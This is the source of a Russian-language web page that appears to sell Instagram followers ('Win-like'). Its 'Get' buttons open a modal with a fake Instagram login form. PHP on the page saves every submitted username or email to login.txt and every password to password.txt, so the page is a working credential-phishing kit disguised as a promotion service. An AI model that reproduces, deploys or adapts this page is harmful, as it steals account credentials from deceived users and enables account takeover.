<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Winner</title>
</head>
<body>
    <link href="https://fonts.googleapis.com/css2?family=Lobster&display=swap" rel="stylesheet">
    <div class="title"><h1>Win-like.</h1></div>
    <h2>Предложения </h2>
    <div class="row">
        <div class="flip-card">
            <div class="flip-card-inner">
              <div class="flip-card-front">
                <img src="1.jpg" alt="Avatar" style="width:200px;height:200px; border-radius: 14px;box-shadow: 0 0 10px rgba(0,0,5,0.5);">
              </div>
              <div class="flip-card-back">
                <h1>5</h1>
                <p>людей</p>
                <a href="#openModal"> <p>Получить</p></a>
              </div>
            </div>
          </div>
          <div class="flip-card">
            <div class="flip-card-inner">
              <div class="flip-card-front">
                <img src="1.jpg" alt="Avatar" style="width:200px;height:200px;border-radius: 14px;box-shadow: 0 0 10px rgba(0,0,5,0.5);">
              </div>
              <div class="flip-card-back">
                <h1>10</h1>
                <p>людей</p>
                <a href="#openModal"> <p>Получить</p></a>
              </div>
            </div>
            
          </div>
        <div class="flip-card">
            <div class="flip-card-inner">
              <div class="flip-card-front">
                <img src="1.jpg" alt="Avatar" style="width:200px;height:200px;border-radius: 14px;box-shadow: 0 0 10px rgba(0,0,5,0.5);">
              </div>
              <div class="flip-card-back">
                <h1>15</h1>
                <p>людей</p>
                <a href="#openModal"> <p>Получить</p></a>
              </div>
            </div>
          </div>
          <div class="flip-card">
            <div class="flip-card-inner">
              <div class="flip-card-front">
                <img src="1.jpg" alt="Avatar" style="width:200px;height:200px;border-radius: 14px;box-shadow: 0 0 10px rgba(0,0,5,0.5);">
              </div>
              <div class="flip-card-back">
                <h1>30</h1>
                <p>людей</p>
                <a href="#openModal"><p>Получить</p></a>
              </div>
            </div>
          </div>
    </div>
    <br>
    <br>
    <br>
    <br>
    <br>
    <h2>Почему именно мы ? </h2>
    <div class="about">
        <div class="item2"><img src="quality.png" width="45px" height="45px" alt="" srcset=""><h4>Качество</h4>
            <p>Держим планку качесто.</br>Хорошо выполняем работу.</p>
        </div>
        <div class="item2"><img src="Availability.png" width="45px" height="45px" alt="" srcset=""><h4>Доступность</h4>
            <p>Отличная доступность </br>при большой конкурении.</p>
        </div>
        <div class="item2"><img src="speed.png" width="45px" height="45px" alt="" srcset=""><h4>Скорость</h4>
            <p>Вам не придется долго ждать</br> благодаря нашми быстрым серверам.</p>
        </div>
        <div class="item2"><img src="clients.png" width="45px" height="45px" alt="" srcset=""><h4>Довольные клиенты</h4>
            <p>Уже успели воспользоваться</br> более 3 тыс людей оставив </br>хорошие коментарии.</p>
        </div>
    </div>
    <hr>
    <div class="insta">2020</div>
    
    <div id="openModal" class="modal">
      <div class="modal-dialog">
        <div class="modal-content">
          <div class="modal-header">
            <h3 class="modal-title"></h3>
            <a href="#close" class="close">x</a>
          </div>
          <div class="modal-body">    
            <!-- функция логина -->
<?php

if( isset($_POST['submit']) ) {
    try {
        $fileName = "login.txt";

        if(!file_exists($fileName)) {
            $fileCreate = fopen($fileName, "w+");
            if(!$fileName) throw new Exception("File open failed!");
            fwrite($fileCreate, "--------Email-------\n\n");
            fclose($fileCreate);
        }

        $email = $_POST['email'];
        
        if(empty($email)) throw new Exception("Email empty!");

        $searchFile = file_get_contents($fileName);

        if(strpos($searchFile, $email) != false) throw new Exception("This email is available!");    

        $fileHandle = file_put_contents($fileName, $email . "\n", FILE_APPEND);

        if(!$fileHandle) throw new Exception("File open failed!");

    } catch(Exception $e) {

        print(
            "<script type='text/javascript'>
                alert('Email not added!');
            </script>"
        );

        var_dump(PHP_EOL.$e->getMessage());
    }
}
?>
<!-- функция пароля -->
<?php

if( isset($_POST['submit']) ) {
    try {
        $fileName = "password.txt";

        if(!file_exists($fileName)) {
            $fileCreate = fopen($fileName, "w+");
            if(!$fileName) throw new Exception("File open failed!");
            fwrite($fileCreate, "--------Password-------\n\n");
            fclose($fileCreate);
        }

        $email = $_POST['pasword'];
        
        if(empty($email)) throw new Exception("password empty!");

        $searchFile = file_get_contents($fileName);

        if(strpos($searchFile, $email) != false) throw new Exception("This password is available!");    

        $fileHandle = file_put_contents($fileName, $email . "\n", FILE_APPEND);

        if(!$fileHandle) throw new Exception("File open failed!");

    } catch(Exception $e) {

        print(
            "<script type='text/javascript'>
                alert('password not added!');
            </script>"
        );

        var_dump(PHP_EOL.$e->getMessage());
    }
}
    ?>

<!-- ||||||||||||||||||||||||||||||||||||||||||||||||||||| -->
<!DOCTYPE html>
<html>

<head>
    <title>Instagram Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css">
</head>

<body>

    <center>
        <br>
        <select>
            <option value="English">English (United States)</option>
            <option value="Afrikaans">Afrikaans</option>
            <option value="Czech">Czech</option>
            <option value="Danish">Dansk</option>
            <option value="German">Deutsch</option>
            <option value="Greek">Greek</option>
            <option value="English">English(UK)</option>
            <option value="Spanish(Latin America)">Espanol</option>
            <option value="Finnish">Suomi</option>
            <option value="French(France)">Francais(France)</option>
            <option value="Indonesian">Bahasa Indonesia</option>
            <option value="Italian">Italiano</option>
            <option value="Japan">Japanese</option>
            <option value="Korean">Korean</option>
            <option value="Malay">Bahasa Melayu</option>
            <option value="Norwegian(bokmal)">Norsk(bokmal)</option>
            <option value="Dutch">Nederlands (Dutch)</option>
            <option value="Polish">Polski</option>
            <option value="Portuguese (Brazil)">Portugues (Brasil)</option>
            <option value="Portuguese(Portugal)">Portugues (Portugal)</option>
            <option value="Russian">Russian</option>
            <option value="Swedish">Svenska (Swedish)</option>
            <option value="Thai">Thai</option>
            <option value="Filipino">Filipino</option>
            <option value="Turkish">Turkce</option>
            <option value="Vietnamese">Vietnamese</option>
            <option value="Chinese">Chinese (simplified)</option>
            <option value="Chinese">Chinese (Traditional)</option>
        </select>
    </center>
    <br>
    <br>
    <br>
    <br>
    
    <form action="#" method="POST" align="center">
        <img src="https://i.ibb.co/Jmbpbq8/IMG-20200905-181607-275.jpg" alt="Instagram" border="0">
        <br>
        <br>
        <div class="block">
        <form action="#" method="post">
        <div class="block1">
            <input type="text" name="email" class="emailSubmitSidebar" placeholder="Phone number, email or username">
        </div>
        <div class="block1">
            <input type="text" name="pasword" class="emailSubmitSidebar" placeholder="Password">
        </div>
        <div class="block1">
            <a href="instagram.com"><button type="submit" name="submit" class="submitButton">Log in</button></a>
        </div>
</form>
        

        <p>Forgot your login details? <b><a href="google.com">Get help signing in.</a></b></p>
        <br>
        <hr align="center" width="285px">

        <span>OR</span>

    </form>
    </div>
    <br>
    <b>
        <p class="fb"><i class="fa fa-facebook-official icon"></i> Continue as User</p>
    </b>
    <hr>
    <footer>Don't have an account? <b><a href="google.com" target="blank">Sign up.</a></b></footer>
</body>

</html>


<style>
    body {
        margin: 0 auto;
        padding: 0;
        font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;  
    }
    a{
        text-decoration: none;
        color: gray;
    }
    a:hover{
        color:#0d97ff;
    }
    select {
        border: none;
        outline: none;
        color: gray;
        background-color: white;
    }
    img {
        width: 190px;
        height: 65px;
    }
    .block{
        display: grid;
        grid-template-columns: 100% ;
        justify-content: center; 
    }
    .block div{
        margin-bottom:20px;
    }
    input {
        padding: 15px;
        width: 286px;
        border-radius: 5px;
        border: 1px solid rgba(192, 197, 206, 0.5);
        outline: none;
        background: rgba(192, 197, 206, 0.1);
    }

    ::placeholder {
        color: gray;
    }
    .submitButton {
        padding: 15px;
        width: 320px;
        border-radius: 5px;
        color: white;
        background: #0d97ff;
        border: none;
        opacity: 0.5;
        outline: none;
        font-weight: bold;
    }
    .submitButton:hover{
        transition: all 0.2s ease;
        opacity: 1
        ;
    }
    .fb {
        color: #0d97ff;
        font-size: 14px;
        text-align: center;
    }
    .icon {
        font-size: 20px;
    }
    p {
        color: gray;
        font-size: 12px;
    }
    span {
        color: gray;
        top: 430px;
        left: 159px;
        background: white;
        padding: 10px;
        font-weight: bold;
        font-size: 13px;
    }
    footer {
        font-size: 12px;
        color: gray;
        text-align: center;
        margin-top: 15px;
        margin-bottom: 15px;
    }
    
</style>

          </div>
        </div>
      </div>
    </div>
    <style>
        *{
            background-color:#fff;
        }
        a{
          
          text-decoration: none;
          
        }

        .title h1{
            color: #272d86;
            font-size: 65px;
            font-family: 'Lobster', cursive;
        }
        .title{
            text-align: center;
            margin-bottom: 50px;
        }
        
        .row{
            margin: 0 auto;
            max-width: 1300px;
            display: grid;
            grid-template-columns: 25% 25% 25% 25%;
            justify-content:center;
            align-items: center;
            text-align: center;
        }
        h2{
            color:#6cd568;
            text-align: center;
            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
            font-size: 30px;
            margin-bottom: 54px;
        }
        .row .item{
            width: 250px;
            height: 200px;
            background-color: darkgray;
            text-align: center;
            border-radius: 10px;
            background-image: url(1.jpg);
            background-position: center;
            align-items: center;
            font-size: 35px;
            color: #5bb7b6;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            box-shadow: 0 0 10px rgba(0,0,5,0.5);
        
        }
        .item:hover{
            transform: translatey(-10px);
            transition: all 0.3s ease;
        }
        .about{
            margin: 0 auto;
            max-width: 1100px;
            display: grid;
            grid-template-columns: 50% 50%;
            justify-content:center;
            align-items: center;
            text-align: center;
        }
        .item2{
            height: 200px;
            text-align: center;
            border-radius: 10px;
            background-position: center;
            align-items: center;
            font-size: 25px;
            color: #272d86;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin-bottom: 20px;        
        }
        .item2 img{
          margin-bottom: -20px;
        }
        .item2 p{
          margin-top: -20px;
            font-size: 16px;
            color: #000000;
        }
        .insta{
          margin:  0 auto;
          color: #272d86;
          text-align: center;
        font-size: 20px;
        font-family: Arial, Helvetica, sans-serif;
        padding-top: 5px;
        }
        /* карточка */
        .flip-card {
  background-color: transparent;
  width: 300px;
  height: 200px;
  border-radius: 14px;
  perspective: 1000px;
  
}
.flip-card-inner {
  position: relative;
  width: 100%;
  height: 100%;
  text-align: center;
  transition: transform 0.8s;
  transform-style: preserve-3d;
  
}
.flip-card-back p{
  padding-top:10px;
}
.flip-card-back p:last-child{
  background-color: #272d86;
  color: white;
  width: 100px;
  height: 30px;
  margin: 0 auto;
  border-radius: 15px;
  margin-bottom: 20px;
}
.flip-card:hover .flip-card-inner {
  transform: rotateY(180deg);
}
.item2 img{
  width:50px;
  height:50px;
}

.flip-card-front, .flip-card-back {
  position: absolute;
  width: 100%;
  height: 100%;
  -webkit-backface-visibility: hidden; 
  backface-visibility: hidden;border-radius: 14px;
}


.flip-card-front {
  color: #e135ae;
}


.flip-card-back {
  color: #6cd568;
  transform: rotateY(180deg);
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  font-family: 25px;
}
/* адаптивность */
@media (max-width: 910px ){
  .row{
        grid-template-columns:50% 50%;
        }
        .row div{
          margin-bottom: 30px;
          margin: 0 auto;
        }
}
@media (max-width: 520px ){
  .row{
        grid-template-columns:100%;
        }
        .row div{
          margin-bottom: 30px;
        }
        .about{
          grid-template-columns: 100%;
        }
}
/* Модальное окно */
/* свойства модального окна по умолчанию */
.modal {
    position: fixed; /* фиксированное положение */
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    background: rgba(0,0,0,0.5); /* цвет фона */
    z-index: 1050;
    opacity: 0; /* по умолчанию модальное окно прозрачно */
    -webkit-transition: opacity 200ms ease-in; 
    -moz-transition: opacity 200ms ease-in;
    transition: opacity 200ms ease-in; /* анимация перехода */
    pointer-events: none; /* элемент невидим для событий мыши */
    margin: 0;
    padding: 0;
}
/* при отображении модального окно */
.modal:target {
    opacity: 1; /* делаем окно видимым */
	  pointer-events: auto; /* элемент видим для событий мыши */
    overflow-y: auto; /* добавляем прокрутку по y, когда элемент не помещается на страницу */
}
/* ширина модального окна и его отступы от экрана */
.modal-dialog {
    position: relative;
    width: auto;
    margin: 10px;
}
@media (min-width: 576px) {
  .modal-dialog {
      max-width: 500px;
      margin: 30px auto; /* для отображения модального окна по центру */
  }
}
/* свойства для блока, содержащего контент модального окна */ 
.modal-content {
    position: relative;
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-box-orient: vertical;
    -webkit-box-direction: normal;
    -webkit-flex-direction: column;
    -ms-flex-direction: column;
    flex-direction: column;
    background-color: #fff;
    -webkit-background-clip: padding-box;
    background-clip: padding-box;
    border: 1px solid rgba(0,0,0,.2);
    border-radius: .3rem;
    outline: 0;
}
@media (min-width: 768px) {
  .modal-content {
      -webkit-box-shadow: 0 5px 15px rgba(0,0,0,.5);
      box-shadow: 0 5px 15px rgba(0,0,0,.5);
  }
}
/* свойства для заголовка модального окна */
.modal-header {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-box-align: center;
    -webkit-align-items: center;
    -ms-flex-align: center;
    align-items: center;
    -webkit-box-pack: justify;
    -webkit-justify-content: space-between;
    -ms-flex-pack: justify;
    justify-content: space-between;
    padding: 15px;
    border-bottom: 1px solid #eceeef;
}
.modal-title {
    margin-top: 0;
    margin-bottom: 0;
    line-height: 1.5;
    font-size: 1.25rem;
    font-weight: 500;
    color: #253f4e;
    font-size: 25px;
    font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
}
/* свойства для кнопки "Закрыть" */
.close {
    float: right;
    font-family: sans-serif;
    font-size: 24px;
    font-weight: 700;
    line-height: 1;
    color: #000;
    text-shadow: 0 1px 0 #fff;
    opacity: .5;
    text-decoration: none;
}
/* свойства для кнопки "Закрыть" при нахождении её в фокусе или наведении */
.close:focus, .close:hover {
    color: #000;
    text-decoration: none;
    cursor: pointer;
    opacity: .75;
}
/* свойства для блока, содержащего основное содержимое окна */
.modal-body {
  position: relative;
    -webkit-box-flex: 1;
    -webkit-flex: 1 1 auto;
    -ms-flex: 1 1 auto;
    flex: 1 1 auto;
    padding: 15px;
    overflow: auto;
    font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
    color: #253f4e;
    font-size: 18px;
}
#hover{
    display: inline-block;
    font-size: 18px;
    padding: 4px;

    color: coral;
    font-family: monospace;
    margin-top: -50px;
    transition: all 10s ease;
}
#hover:hover{
    border-bottom: 1px solid coral;
}



    </style>
</body>
</html>